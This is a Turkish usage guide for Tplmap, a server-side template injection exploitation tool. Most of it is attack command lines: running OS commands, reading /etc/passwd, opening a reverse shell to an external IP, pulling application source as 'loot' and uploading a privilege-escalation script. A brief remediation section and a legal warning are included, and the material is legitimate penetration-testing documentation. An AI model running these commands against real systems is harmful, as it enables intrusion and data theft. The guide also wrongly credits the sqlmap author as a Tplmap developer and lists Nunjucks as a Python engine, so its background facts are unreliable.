# 🎭 Tplmap - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English Version](../README.md)

```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Sunucu Taraflı Şablon Enjeksiyonu (SSTI) Otomatik İstismar Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_İstismarı-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Kategori-Web_Güvenliği_&_API-orange?style=for-the-badge" alt="Web Güvenliği">
  <img src="https://img.shields.io/badge/Motorlar-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Şablon Motorları">
  <img src="https://img.shields.io/badge/Lisans-GPLv2-red?style=for-the-badge" alt="Lisans GPLv2">
</p>

<p align="center">
  <b>🌐 Sunucu Taraflı Şablon Enjeksiyonu (SSTI) açıklarını otomatik tespit edip işletim sisteminde kod çalıştırma (RCE) ve kabuk alma aracı</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış & SSTI Zafiyeti](#-genel-bakış--ssti-zafiyeti)
- [Desteklenen Şablon Motorları](#-desteklenen-şablon-motorları)
- [Kurulum](#-kurulum)
- [Temel Zafiyet Tespiti](#-temel-zafiyet-tespiti)
- [Özel Enjeksiyon Noktası Belirleme (`*` işareti)](#-özel-enjeksiyon-noktası-belirleme--işareti)
- [Uzaktan Komut Çalıştırma (`--os-cmd`)](#-uzaktan-komut-çalıştırma---os-cmd)
- [Etkileşimli ve Ters Kabuk Bağlantıları](#-etkileşimli-ve-ters-kabuk-bağlantıları)
- [Dosya İndirme ve Yükleme](#-dosya-indirme-ve-yükleme)
- [POST Verisi ve Başlıkları Test Etme](#-post-verisi-ve-başlıkları-test-etme)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Açısından Değerlendirme & Giderme](#-savunma-açısından-değerlendirme--giderme)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış & SSTI Zafiyeti

**Sunucu Taraflı Şablon Enjeksiyonu (SSTI)**, bir web uygulamasının kullanıcıdan gelen girdileri güvenli bir değişken olarak şablona aktarmak yerine, doğrudan şablon metninin içine gömmesi sonucu oluşur. Modern şablon motorları `{{7*7}}` veya `${7*7}` gibi matematiksel ifadeleri çalıştırdığından, saldırganlar şablon kum havuzunu (sandbox) aşarak alt katmandaki programlama dili çalışma ortamına (Python, Java, PHP, Ruby, Node.js) erişir.

**Miroslav Stampar** ve **Emilio Pinna** tarafından geliştirilen **Tplmap**, şablon motorları için bir nevi "SQLMap" görevi görür. Aktif şablon motorunu parmak iziyle tanır, kum havuzunu atlatır ve uzaktan işletim sistemi kabuğuna erişim sağlar.

---

## 🧩 Desteklenen Şablon Motorları

| Programlama Dili | Desteklenen Şablon Motorları |
|------------------|------------------------------|
| **Python** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Twig, Smarty |
| **Java** | Freemarker, Velocity |
| **Ruby** | ERB, Slim |
| **Node.js** | Jade, Pug, Dust.js |

---

## 📥 Kurulum

```bash
# GitHub deposunu klonlama
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Bağımlılıkları yükleme
pip install -r requirements.txt

# Yardım menüsünü görüntüleme
python tplmap.py --help
```

---

## 🚀 Temel Zafiyet Tespiti

```bash
# GET parametresinde SSTI taraması
python tplmap.py -u "http://hedef.local/sayfa?isim=Ahmet"

# Yıldız (*) işaretiyle enjeksiyon noktasını kesin olarak belirtme
python tplmap.py -u "http://hedef.local/profil?id=1&hakkinda=*"
```

---

## 💻 Uzaktan Komut Çalıştırma (`--os-cmd`)

Şablon motoru tespit edildiğinde sunucuda doğrudan işletim sistemi komutu çalıştırın:

```bash
# Hedefte whoami komutunu çalıştırma
python tplmap.py -u "http://hedef.local/sayfa?isim=*" --os-cmd "whoami; id"

# /etc/passwd dosyasını okuma
python tplmap.py -u "http://hedef.local/sayfa?isim=*" --os-cmd "cat /etc/passwd"
```

---

## 💀 Etkileşimli ve Ters Kabuk Bağlantıları

```bash
# Tplmap konsolunda etkileşimli terminal açma
python tplmap.py -u "http://hedef.local/sayfa?isim=*" --os-shell

# Netcat dinleyicisine tam ters bağlantı (Reverse Shell) açma
python tplmap.py -u "http://hedef.local/sayfa?isim=*" \
  --reverse-shell 10.10.14.5 4444
```

---

## 📁 Dosya İndirme ve Yükleme

```bash
# Sunucudan kaynak kod dosyasını yerel makineye indirme
python tplmap.py -u "http://hedef.local/sayfa?isim=*" \
  --download /var/www/html/app.py ./app_loot.py

# Hedef sunucunun /tmp dizinine yerel betik yükleme
python tplmap.py -u "http://hedef.local/sayfa?isim=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```

---

## 🌐 POST Verisi ve Başlıkları Test Etme

```bash
# POST gövdesindeki parametreyi test etme
python tplmap.py -u "http://hedef.local/yorum" -d "yazar=test&yorum=*"

# HTTP Başlıklarını test etme
python tplmap.py -u "http://hedef.local/panel" -H "User-Agent: *"

# Oturum çerezi ile yetkili sayfayı tarama
python tplmap.py -u "http://hedef.local/hosgeldin?kullanici=*" -c "session=xyz123"
```

---

## ⚡ Hızlı Referans Tablosu

| İşlem | Komut |
|-------|-------|
| **SSTI Taraması Yap** | `python tplmap.py -u "<URL>?param=*"` |
| **Sistem Komutu Çalıştır** | `python tplmap.py -u "<URL>" --os-cmd="<KOMUT>"` |
| **Etkileşimli Terminal Aç** | `python tplmap.py -u "<URL>" --os-shell` |
| **Ters Kabuk Başlat** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Sunucudan Dosya İndir** | `python tplmap.py -u "<URL>" --download <UZAK> <YEREL>` |
| **Sunucuya Dosya Yükle** | `python tplmap.py -u "<URL>" --upload <YEREL> <UZAK>` |
| **POST Verisini Test Et** | `python tplmap.py -u "<URL>" -d "veri=*"` |

---

## 🛡️ Savunma Açısından Değerlendirme & Giderme

1. **Bağlamsal Değişken Bağlama:** Kullanıcı girdilerini doğrudan şablon dizgisiyle birleştirmeyin. Değişkenleri şablon motoruna ayrılmış veri olarak aktarın (örn. Jinja2 için: `render_template('hello.html', isim=kullanici_girdisi)`).
2. **Kum Havuzu (Sandbox):** Kullanıcının dinamik şablon yazmasının zorunlu olduğu ortamlarda `__class__`, `__mro__` ve yansıtma (reflection) nesnelerine erişimi tamamen engelleyen katı kısıtlamalar uygulayın.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Tplmap hedef sunucuda doğrudan kod çalıştırır. İzin alınmaksızın web sistemlerinde SSTI açıklarını aramak veya sömürmek yasalara aykırıdır.